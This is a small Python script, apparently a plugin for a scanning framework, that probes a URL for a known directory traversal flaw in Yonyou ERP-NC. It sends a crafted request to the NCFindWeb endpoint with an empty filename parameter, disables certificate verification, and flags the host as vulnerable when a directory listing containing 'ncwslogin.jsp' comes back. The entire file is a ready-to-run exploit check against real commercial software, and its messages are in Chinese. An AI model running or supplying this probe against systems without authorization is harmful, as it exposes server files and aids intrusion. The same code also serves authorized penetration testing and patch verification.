#!/usr/bin/env python
# coding=utf-8
#ERP-NCNCFindWeb目录遍历漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url +'/NCFindWeb?service=IPreAlertConfigService&filename=', verify=False,timeout=20)
        if response.status_code == 200 and 'ncwslogin.jsp' in response.text:
            print(colored('[+]存在用友ERP-NCNCFindWeb目录遍历漏洞', 'red'))
            results = f'{urls}-->存在用友ERP-NCNCFindWeb目录遍历漏洞'
        else:
            print('[-]不存在用友ERP-NCNCFindWeb目录遍历漏洞')
    except:
        print('[-]不存在用友ERP-NCNCFindWeb目录遍历漏洞')


def YPNCFILEDIR(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
